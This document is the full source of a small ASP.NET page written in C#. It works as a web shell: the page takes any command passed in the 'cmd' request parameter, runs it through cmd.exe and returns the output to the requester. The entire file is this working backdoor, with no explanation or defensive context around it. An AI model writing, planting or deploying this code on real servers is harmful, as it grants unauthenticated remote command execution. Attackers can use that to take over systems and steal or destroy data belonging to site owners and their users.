<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
    string cmd = Request["cmd"];
    if (cmd != null)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = "cmd.exe";
        proc.StartInfo.Arguments = "/c " + cmd;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.StartInfo.UseShellExecute = false;
        proc.Start();
        Response.Write(proc.StandardOutput.ReadToEnd());
    }
%>
